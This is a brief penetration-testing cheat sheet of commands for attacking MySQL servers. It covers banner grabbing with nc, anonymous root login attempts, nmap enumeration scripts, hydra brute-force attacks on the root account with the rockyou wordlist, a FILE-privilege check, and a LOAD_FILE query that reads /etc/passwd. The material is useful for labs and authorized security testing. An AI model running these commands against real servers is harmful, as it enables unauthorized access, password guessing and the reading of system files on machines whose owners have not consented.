## MySQL Banner

```bash
mysql -h <T_IP> -u test
```

```bash
nc -nv <T_IP> 3306
```

## MySQL Anonymous Login

```bash
mysql -h <T_IP> -u root
```

## MySQL Enumeration Scripts

```bash
nmap -p 3306 --script mysql-* <T_IP>
```

## Login to MySQL to Execute Queries

```bash
mysql -h <ip> -u root -p
```

## Brute Force

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<T_IP>
```

```bash
hydra -l root -P passwords.txt <T_IP> mysql -s 3306 -t 1 -f -V
```

## Check FILE Privileges

```sql
SELECT file_priv FROM mysql.user WHERE user='root';
```

## Read /etc/passwd

```sql
SELECT LOAD_FILE('/etc/passwd');
```
